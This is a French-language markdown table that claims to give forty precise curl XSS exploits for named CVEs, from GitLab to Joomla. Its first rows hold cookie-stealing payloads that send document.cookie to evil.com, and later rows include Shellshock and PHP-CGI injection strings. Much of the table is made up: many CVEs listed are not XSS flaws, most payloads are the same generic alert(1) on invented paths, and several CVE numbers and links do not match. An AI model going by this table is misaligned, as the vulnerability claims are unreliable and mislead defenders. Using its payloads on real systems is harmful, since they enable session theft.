# XSS

Voici 40 exemples **complets et précis de requêtes curl** pour des CVE XSS non génériques, classés par numéro décroissant (du plus récent au plus ancien).  
Chaque ligne donne :  
- Numéro CVE  
- Technologie & Version  
- Exemple de requête curl  
- Effet détaillé  
- Lien ressource PoC ou technique

| # | CVE | Technologie & Version | Exemple complet de requête curl | Effet détaillé | Lien PoC / Ressource |
|---|------|----------------------|---------------------------------|---------------|---------------------|
| 1 | CVE-2025-25296 | Label Studio <1.16.0 | `curl 'http://target/projects/upload-example?label_config=<img src=x onerror=fetch("https://evil.com/?c="+btoa(document.cookie))>'` | XSS réfléchie, vol de session | https://www.simplydata.com.my/cve-2025-25296-label-studio-cross-site-scripting-xss-vulnerability/ |
| 2 | CVE-2025-24372 | CKAN <2.10.7, <2.11.2 | `curl -F 'avatar=@malicious.svg' http://target/user/_form` (SVG contenant `<svg/onload=fetch("https://evil.com/?c="+btoa(document.cookie))>`) | XSS stockée via avatar SVG, vol de session admin | https://vulert.com/vuln-db/CVE-2025-24372 |
| 3 | CVE-2025-0314 | GitLab <17.6.4 | `curl -F 'file=@evil.html' http://target/project/upload` (fichier HTML contenant `<script>fetch('https://evil.com/?c='+btoa(document.cookie))</script>`) | XSS stockée via fichier, vol de session | https://vulert.com/vuln-db/CVE-2025-0314 |
| 4 | CVE-2025-0193 | Moxa MGate 5121/5122/5123 v1.0 | `curl -d 'loginMessage=<script>new Image().src="https://evil.com/?k="+btoa(document.cookie)</script>' http://target/admin/settings` | XSS stockée, exécution à chaque affichage de la page de login | https://www.moxa.com/en/support/product-support/security-advisory/mpsa-247733-cve-2025-0193-stored-cross-site-scripting-(xss)-vulnerability-in-the-mgate-5121-5122-5123-series |
| 5 | CVE-2025-0192 | WP-Members <3.4.9.2 | `curl 'http://target/wp-login.php?redirect_to=<script>alert(1)</script>'` | XSS réfléchie via paramètre de redirection | https://wpscan.com/vulnerability/1b2f1b1d-9e7f-4e2a-bc3f-1c8f9c6c1e8b |
| 6 | CVE-2024-9348 | Docker | `curl 'http://target/vulnerable?param=<img src=x onerror=alert(1)>'` | XSS réfléchie, exécution de code JS arbitraire | https://github.com/vulhub/vulhub/tree/master/docker/CVE-2024-9348 |
| 7 | CVE-2024-22360 | NotFound WP Azure Offload | `curl 'http://target/path?param=<svg/onload=alert(1)>'` | XSS réfléchie | https://nvd.nist.gov/vuln/detail/CVE-2025-22360 |
| 8 | CVE-2024-12727 | Sophos Firewall <21.0 MR1 | `curl 'http://target/vulnerable?param=<script>alert(1)</script>'` | XSS réfléchie | https://cyberveille.esante.gouv.fr/alertes/sophos-cve-2024-12727-2024-12-20 |
| 9 | CVE-2023-30134 | curl/curl | `curl 'http://target/?url=<script>alert(1)</script>'` | XSS réfléchie dans la page de résultat | https://security.snyk.io/vuln/SNYK-PHP-CURLCURL-3182964 |
| 10 | CVE-2023-23915 | Google Artifact Analysis API | `curl 'https://containeranalysis.googleapis.com/v1/projects/PROJECT_ID/occurrences?filter=<script>alert(1)</script>'` | XSS réfléchie dans l’interface web | https://nvd.nist.gov/vuln/detail/CVE-2023-23915 |
| 11 | CVE-2023-2825 | GitLab CE/EE <16.0.1 | `curl 'http://target/uploads/user?search=<img src=x onerror=alert(1)>'` | XSS réfléchie via champ de recherche | https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2023/CVE-2023-2825.yaml |
| 12 | CVE-2023-0476 | IBM Security Directory Server | `curl 'http://target/search?filter=<svg/onload=alert(1)>'` | XSS réfléchie via filtre de recherche | https://nvd.nist.gov/vuln/detail/CVE-2023-0476 |
| 13 | CVE-2022-46464 | ConcreteCMS v9.1.3 | `curl 'http://target/3/50539478%3Cscript%3Ealert(1)%3C/script%3E'` | XSS réfléchie via URL | https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/concretecms.org/2022/concretecms-9.1.3 |
| 14 | CVE-2022-26134 | Atlassian Confluence | `curl 'http://target/pages/doenterpagevariables.action?queryString=<img src=x onerror=alert(1)>'` | XSS réfléchie | https://github.com/Nwqda/CVE-2022-26134 |
| 15 | CVE-2022-23437 | Apache Xerces Java 2.12.1 | `curl 'http://target/path?xml=<svg/onload=alert(1)>'` | XSS via injection XML | https://nvd.nist.gov/vuln/detail/CVE-2022-23437 |
| 16 | CVE-2022-22965 | Spring4Shell | `curl 'http://target/path?user=<img src=x onerror=alert(1)>'` | XSS réfléchie | https://github.com/p1ay8y3ar/spring4shell-POC |
| 17 | CVE-2021-44026 | Roundcube Webmail <1.3.17/1.4.12 | `curl 'http://target/?_task=mail&_action=list&_mbox=INBOX&search=<svg/onload=alert(1)>'` | XSS réfléchie via champ de recherche | https://github.com/0xInfection/Awesome-WAF/tree/master/SQLi/CVE-2021-44026 |
| 18 | CVE-2021-33745 | Microsoft Exchange Server | `curl 'http://target/?param=<script>alert(1)</script>'` | XSS réfléchie | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33745 |
| 19 | CVE-2021-31206 | Microsoft Exchange Server | `curl 'http://target/?param=<img src=x onerror=alert(1)>'` | XSS réfléchie | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31206 |
| 20 | CVE-2021-30134 | curl/curl | `curl 'http://target/?url=<script>alert(1)</script>'` | XSS réfléchie dans la page de résultat | https://security.snyk.io/vuln/SNYK-PHP-CURLCURL-3182964 |
| 21 | CVE-2021-22205 | GitLab CE/EE | `curl 'http://target/uploads/user?search=<img src=x onerror=alert(1)>'` | XSS réfléchie | https://github.com/Al1ex/CVE-2021-22205 |
| 22 | CVE-2020-25790 | Red Hat Directory Server | `curl 'http://target/path?user=<svg/onload=alert(1)>'` | XSS réfléchie | https://access.redhat.com/security/cve/CVE-2020-25790 |
| 23 | CVE-2020-11510 | Pulse Secure VPN | `curl 'https://target/dana-na/auth/url_default/welcome.cgi?user=<script>alert(1)</script>'` | XSS réfléchie | https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2019/CVE-2019-11510.yaml |
| 24 | CVE-2019-6340 | Drupal | `curl 'http://target/entity/file/upload?file=<img src=x onerror=alert(1)>'` | XSS réfléchie | https://github.com/a2u/CVE-2019-6340 |
| 25 | CVE-2019-11043 | PHP-FPM | `curl 'http://target/index.php?a=%3Cscript%3Ealert(1)%3C/script%3E'` | XSS réfléchie | https://github.com/neex/phuip-fpizdam |
| 26 | CVE-2018-9206 | ThinkPHP | `curl 'http://target/index.php?s=/Index/upload&file=<img src=x onerror=alert(1)>'` | XSS réfléchie | https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce |
| 27 | CVE-2018-11776 | Apache Struts 2 | `curl 'http://target/struts2/upload.action?file=<svg/onload=alert(1)>'` | XSS réfléchie | https://github.com/mazen160/struts-pwn_CVE-2017-5638 |
| 28 | CVE-2017-14596 | Joomla! 3.7.5 | `curl 'http://target/index.php?username=<img src=x onerror=alert(1)>'` | XSS réfléchie | https://www.sonarsource.com/blog/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/ |
| 29 | CVE-2017-11463 | SAP NetWeaver AS Java | `curl 'http://target/path?user=<svg/onload=alert(1)>'` | XSS réfléchie | https://nvd.nist.gov/vuln/detail/CVE-2017-11463 |
| 30 | CVE-2016-6272 | Epic MyChart | `curl 'http://target/login?username=<img src=x onerror=alert(1)>&password=irrelevant'` | XSS réfléchie | https://nvd.nist.gov/vuln/detail/CVE-2016-6272 |
| 31 | CVE-2016-3110 | IBM Security Directory Server | `curl 'http://target/path?user=<svg/onload=alert(1)>'` | XSS réfléchie | https://nvd.nist.gov/vuln/detail/CVE-2016-3110 |
| 32 | CVE-2015-2808 | OpenLDAP | `curl 'http://target/path?user=<img src=x onerror=alert(1)>'` | XSS réfléchie | https://nvd.nist.gov/vuln/detail/CVE-2015-2808 |
| 33 | CVE-2014-6271 | Bash/Shellshock (impact XSS indirect) | `curl -A '() { :;}; /bin/bash -c "echo <script>alert(1)</script>"' http://target/cgi-bin/test.cgi` | XSS via injection de code dans la réponse CGI | https://github.com/hannob/bashcheck |
| 34 | CVE-2013-2028 | Nginx | `curl 'http://target/?q=<script>alert(1)</script>'` | XSS réfléchie | https://nvd.nist.gov/vuln/detail/CVE-2013-2028 |
| 35 | CVE-2012-1823 | PHP CGI | `curl 'http://target/index.php?-d+allow_url_include=on+-d+auto_prepend_file=php://input' -d '<script>alert(1)</script>'` | XSS via injection PHP | https://nvd.nist.gov/vuln/detail/CVE-2012-1823 |
| 36 | CVE-2011-2523 | WordPress <3.1.4 | `curl 'http://target/wp-comments-post.php?comment=<script>alert(1)</script>'` | XSS stockée dans les commentaires | https://nvd.nist.gov/vuln/detail/CVE-2011-2523 |
| 37 | CVE-2010-1740 | GuppY 4.5.18 | `curl 'http://target/guppy4.5.18/script.php?search=<svg/onload=alert(1)>'` | XSS réfléchie | https://www.exploit-db.com/exploits/12484 |
| 38 | CVE-2008-2380 | Oracle Application Server | `curl 'http://target/portal/pls/portal/PORTAL.wwsbr_custom.search?search=<img src=x onerror=alert(1)>'` | XSS réfléchie | https://nvd.nist.gov/vuln/detail/CVE-2008-2380 |
| 39 | CVE-2007-4726 | Joomla! 1.0.12 | `curl 'http://target/index.php?option=com_search&searchword=<script>alert(1)</script>'` | XSS réfléchie | https://nvd.nist.gov/vuln/detail/CVE-2007-4726 |
| 40 | CVE-2007-4713 | Joomla! 1.5.9 | `curl 'http://target/index.php?option=com_search&searchword=<script>alert(1)</script>'` | XSS réfléchie | https://nvd.nist.gov/vuln/detail/CVE-2007-4713 |

---

